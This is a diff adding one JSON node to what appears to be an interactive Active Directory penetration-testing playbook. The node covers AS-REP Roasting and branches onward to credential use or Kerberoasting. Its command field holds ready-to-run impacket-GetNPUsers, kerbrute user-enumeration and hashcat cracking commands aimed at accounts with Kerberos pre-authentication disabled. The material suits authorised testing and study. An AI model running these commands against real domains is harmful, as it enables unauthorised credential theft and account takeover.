@@ -1,0 +1,18 @@
+{
+  "id": "asrep_roast",
+  "phase": "AD",
+  "title": "AS-REP Roasting",
+  "body": "Accounts with pre-auth disabled hand you encrypted TGTs to crack offline. Fast, no noise, no lockout risk.",
+  "cmd": "# From Kali — no password needed if pre-auth disabled\nimpacket-GetNPUsers domain.com/ \\\n  -usersfile users.txt -dc-ip $ip \\\n  -request -outputfile asrep.txt\n\n# With creds (more reliable)\nimpacket-GetNPUsers domain.com/user:'pass' \\\n  -dc-ip $ip -request -o asrep.kerb\n\n# Kerbrute (also finds them)\n./kerbrute_linux_amd64 userenum \\\n  -d domain.com --dc $ip \\\n  /opt/SecLists/Usernames/Names/names.txt\n\n# Crack\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt rockyou.txt -r best64.rule",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Cracked — got new account creds",
+      "next": "creds_found"
+    },
+    {
+      "label": "No pre-auth disabled accounts — Kerberoast",
+      "next": "kerberoast"
+    }
+  ]
+}
